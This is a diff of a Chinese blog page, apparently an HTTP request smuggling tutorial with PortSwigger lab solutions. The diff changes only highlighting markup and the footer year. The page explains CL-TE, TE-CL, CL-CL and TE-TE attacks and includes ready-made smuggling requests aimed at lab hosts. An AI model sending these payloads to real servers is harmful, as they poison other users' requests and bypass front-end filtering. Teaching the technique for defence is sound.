@@ -169,16 +169,16 @@
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-<span class="n">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
-<span class="err">b</span>
-
-a=11
-
-0
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+</span></span><span class="line"><span class="cl"><span class="err">b</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">a=11
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>其实理解起来真的很简单，相当于我发送请求，包含<code>Content-Length</code>，前端服务器解析后没有问题发送给后端服务器，但是我在请求时后面还包含了<code>Transfer-Encoding</code>，这样后端服务器进行解析便可执行我写在下面的一些命令，这样便可以绕过前端的 waf。</p>
 <h2 id="2-实例">2 实例</h2>
@@ -196,14 +196,14 @@ a=11
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">GET / HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span><span class="err">Content-Length: 44\r\n
-</span><span class="err">
-</span><span class="err">GET / secret HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span><span class="err">\r\n
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 44\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">GET / secret HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>前端服务器收到该请求，通过读取 <code>Content-Length</code>，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对 <code>Content-Length</code> 进行处理，由于 <code>Pipeline</code> 的存在，它就认为这是收到了两个请求，分别是</p>
 <div class="highlight"><div class="chroma">
@@ -217,14 +217,14 @@ a=11
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err"># 第一个
-</span><span class="err">GET / HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span><span class="err">
-</span><span class="err"># 第二个
-</span><span class="err">GET /secret HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err"># 第一个
+</span></span></span><span class="line"><span class="cl"><span class="err">GET / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"># 第二个
+</span></span></span><span class="line"><span class="cl"><span class="err">GET /secret HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="22-cl-cl">2.2 CL-CL</h3>
 <p>在 <code>RFC7230</code> 的第 <code>3.3.3</code> 节中的第四条中，规定当服务器收到的请求中包含两个 <code>Content-Length</code>，而且两者的值不同时，需要返回 400 错误。</p>
@@ -241,14 +241,14 @@ a=11
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span><span class="err">Content-Length: 8\r\n
-</span><span class="err">Content-Length: 7\r\n
-</span><span class="err">
-</span><span class="err">12345\r\n
-</span><span class="err">a
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">POST / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 8\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 7\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">12345\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">a
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>中间代理服务器获取到的数据包的长度为 8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为 7。当读取完前 7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母 <code>a</code>，对于后端服务器来说，这个 <code>a</code> 是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其它的正常用户对服务器进行了请求，假设请求如图所示：</p>
 <div class="highlight"><div class="chroma">
@@ -257,9 +257,9 @@ a=11
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">GET /index.html HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /index.html HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用 TCP 连接。</p>
 <p>这时候正常用户的请求就拼接到了字母 <code>a</code> 的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p>
@@ -269,9 +269,9 @@ a=11
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">aGET /index.html HTTP/1.1\r\n
-</span><span class="err">Host: example.com\r\n
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">aGET /index.html HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: example.com\r\n
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>这时候用户就会收到一个类似于 <code>aGET request method not found</code> 的报错。这样就实现了一次 HTTP 走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于 CSRF 的攻击方式。</p>
 <p>但是两个 <code>Content-Length</code> 这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在 <code>RFC2616</code> 的第 4.4 节中，规定:<code>如果收到同时存在 Content-Length 和 Transfer-Encoding 这两个请求头的请求包时，在处理的时候必须忽略 Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回 <code>400</code> 错误。服务器在这里的实现更容易出问题。</p>
@@ -296,19 +296,19 @@ a=11
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
-</span><span class="err">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
-</span><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
-</span><span class="err">Accept-Language: en-US,en;q=0.5\r\n
-</span><span class="err">Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n
-</span><span class="err">Connection: keep-alive\r\n
-</span><span class="err">Content-Length: 6\r\n
-</span><span class="err">Transfer-Encoding: chunked\r\n
-</span><span class="err">\r\n
-</span><span class="err">0\r\n
-</span><span class="err">\r\n
-</span><span class="err">G
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">POST / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: en-US,en;q=0.5\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Connection: keep-alive\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 6\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Transfer-Encoding: chunked\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">0\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">G
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>连续发送几次请求就可以获得该响应：</p>
 <p><img
@@ -340,20 +340,20 @@ a=11
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
-</span><span class="err">Host: ac041f531eabd0cd804edb62000c0025.web-security-academy.net\r\n
-</span><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
-</span><span class="err">Accept-Language: en-US,en;q=0.5\r\n
-</span><span class="err">Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n
-</span><span class="err">Content-Length: 4\r\n
-</span><span class="err">Transfer-Encoding: chunked\r\n
-</span><span class="err">\r\n
-</span><span class="err">12\r\n
-</span><span class="err">GPOST / HTTP/1.1\r\n
-</span><span class="err">\r\n
-</span><span class="err">0\r\n
-</span><span class="err">\r\n
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">POST / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: ac041f531eabd0cd804edb62000c0025.web-security-academy.net\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: en-US,en;q=0.5\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 4\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Transfer-Encoding: chunked\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">12\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">GPOST / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">0\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -374,13 +374,13 @@ a=11
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">G</span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">15</span>
-
-x=1
-0
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">G</span><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">15</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">x=1
+</span></span><span class="line"><span class="cl">0
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="25-te-te">2.5 TE-TE</h3>
 <p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理 <code>Transfer-Encoding</code> 请求头，这确实是实现了 RFC 的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的 <code>Transfer-Encoding</code> 进行某种混淆操作，从而使其中一个服务器不处理 <code>Transfer-Encoding</code> 请求头。从某种意义上还是 <code>CL-TE</code> 或者 <code>TE-CL</code>。</p>
@@ -408,25 +408,25 @@ x=1
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">POST / HTTP/1.1\r\n
-</span><span class="err">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
-</span><span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
-</span><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
-</span><span class="err">Accept-Language: en-US,en;q=0.5\r\n
-</span><span class="err">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
-</span><span class="err">Content-length: 4\r\n
-</span><span class="err">Transfer-Encoding: chunked\r\n
-</span><span class="err">Transfer-encoding: cow\r\n
-</span><span class="err">\r\n
-</span><span class="err">5c\r\n
-</span><span class="err">GPOST / HTTP/1.1\r\n
-</span><span class="err">Content-Type: application/x-www-form-urlencoded\r\n
-</span><span class="err">Content-Length: 15\r\n
-</span><span class="err">\r\n
-</span><span class="err">x=1\r\n
-</span><span class="err">0\r\n
-</span><span class="err">\r\n
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">POST / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: en-US,en;q=0.5\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-length: 4\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Transfer-Encoding: chunked\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Transfer-encoding: cow\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">5c\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">GPOST / HTTP/1.1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/x-www-form-urlencoded\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 15\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">x=1\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">0\r\n
+</span></span></span><span class="line"><span class="cl"><span class="err">\r\n
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -464,7 +464,7 @@ x=1
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
